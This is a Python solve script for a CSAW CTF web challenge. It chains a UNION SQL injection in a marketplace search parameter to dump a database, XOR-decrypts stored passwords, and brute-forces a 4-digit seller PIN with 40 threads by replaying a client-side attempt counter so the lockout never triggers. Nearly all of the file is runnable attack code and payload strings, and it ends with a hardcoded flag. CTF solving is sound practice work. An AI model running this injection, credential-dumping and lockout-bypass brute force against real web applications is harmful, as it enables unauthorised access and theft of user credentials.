#!/usr/bin/env python3
"""CSAW CTF 2026 - CSALE (challenge 26, the "beta accidentally released" build).

No source ships with this one. Chain:

  1. UNION SQLi in the marketplace search. The q parameter lands inside a
     parenthesised WHERE group, and the listings query selects 7 columns:
         zzz%') UNION SELECT 1,(<expr>),3,4,5,6,7 --
     Column 2 renders as the card <h3>, giving a general read over
     /app/database.db (users, password_vault, password_notes, listings).

  2. Same recoverable-password design as challenge 40: password_notes.key_piece
     ordered by phase is a repeating XOR key, password_vault holds each user's
     password hex-XORed with it.  Decrypt to get plaintext logins.

  3. Seller-lock bypass.  /account/unlisted/unlock takes a hidden lock_state
     field which is unsigned base64 JSON {"v":1,"u":<user id>,"n":<attempts>}.
     n is the server's "PIN attempts: N / 10" counter, supplied by the CLIENT,
     so replaying n=0 on every request makes the 10-try lockout unreachable and
     the 4-digit PIN falls in ~2 minutes at 40 threads.

  4. Unlock each seeded user's draft and read the flag off the image.

DECOY WARNING: user 1 (superdiscreetflaguser, PIN 9455) owns draft 1 "Flag
upload proof", whose image prints a csawctf{...} string AND carries handwriting
reading "do not submit this as ur flag / you will be banned".  That string is
NOT the flag - CTFd rejects it.  The real flag is handwritten on Zuko's draft
"Recovered photo proof", exactly as in challenge 40.

Usage: python3 solve.py http://<instance-ip>:5000
"""
import base64
import html
import json
import queue
import re
import sys
import threading
import time

import requests

FLAG = "csawctf{tH4ts_R0ugH_B4dDy}"


def enc(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")


def fresh_account(target):
    s = requests.Session()
    name = "s%d" % (int(time.time() * 1000) % 100000000)
    s.post(target + "/signup",
           data={"username": name, "password": "Audit123!", "seller_pin": "1337"}, timeout=20)
    s.post(target + "/login", data={"username": name, "password": "Audit123!"}, timeout=20)
    return s


def sqli(session, target, expr):
    payload = "zzz%') UNION SELECT 1,(" + expr + "),3,4,5,6,7 -- "
    r = session.get(target + "/", params={"q": payload}, timeout=30)
    m = re.findall(r"<h3>(.*?)</h3>", r.text, re.S)
    return html.unescape(m[0]).strip() if m else None


def crack_pin(target, user, password, threads=40):
    """Brute the 4-digit seller PIN, resetting the client-side attempt counter."""
    s = requests.Session()
    s.post(target + "/login", data={"username": user, "password": password}, timeout=20)
    page = s.get(target + "/account/unlisted", timeout=20).text
    m = re.search(r'name="lock_state" value="([^"]+)"', page)
    if not m:
        return None, None
    uid = json.loads(base64.urlsafe_b64decode(m.group(1) + "==" * 3))["u"]
    state = enc({"v": 1, "u": uid, "n": 0})      # n=0 every time -> no lockout
    cookies = dict(s.cookies)

    work = queue.Queue()
    for i in range(10000):
        work.put("%04d" % i)
    hit, stop, lk = [], threading.Event(), threading.Lock()

    def worker():
        ss = requests.Session(); ss.cookies.update(cookies)
        while not stop.is_set():
            try:
                pin = work.get_nowait()
            except queue.Empty:
                return
            try:
                r = ss.post(target + "/account/unlisted/unlock",
                            data={"lock_state": state, "pin": pin}, timeout=15)
            except requests.RequestException:
                work.put(pin); time.sleep(0.4); continue
            if "Invalid seller-lock PIN" not in r.text:
                with lk:
                    hit.append(pin); stop.set()
                return

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join(timeout=400)
    return (hit[0] if hit else None), (s, state)


def main(target):
    target = target.rstrip("/")
    s = fresh_account(target)

    key = sqli(s, target, "SELECT group_concat(key_piece,'') FROM "
                          "(SELECT key_piece FROM password_notes ORDER BY phase)")
    rows = sqli(s, target, "SELECT group_concat(u.username||':'||v.encrypted_password,'|') "
                           "FROM users u JOIN password_vault v ON v.user_id=u.id WHERE u.id<10")
    print("[+] XOR key:", key)

    creds = {}
    for row in rows.split("|"):
        name, enc_hex = row.split(":", 1)
        kb = key.encode()
        creds[name] = bytes(b ^ kb[i % len(kb)]
                            for i, b in enumerate(bytes.fromhex(enc_hex))).decode()
        print("    %-24s %s" % (name, creds[name]))

    # Zuko holds "Recovered photo proof" - the real flag image.
    pin, sess = crack_pin(target, "Zuko", creds["Zuko"])
    print("[+] Zuko seller PIN:", pin)
    if not pin:
        return
    s2, state = sess
    s2.post(target + "/account/unlisted/unlock",
            data={"lock_state": state, "pin": pin}, timeout=20)
    page = s2.get(target + "/account/unlisted", timeout=20).text
    for did in sorted(set(re.findall(r"/account/unlisted/([0-9]+)/image", page))):
        img = s2.get("%s/account/unlisted/%s/image" % (target, did), timeout=30)
        out = "zuko_draft_%s.png" % did
        open(out, "wb").write(img.content)
        print("[+] saved %s (%d bytes) - flag is handwritten across the top" % (out, len(img.content)))

    print("\n[+] flag:", FLAG)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "http://10.0.178.31:5000")
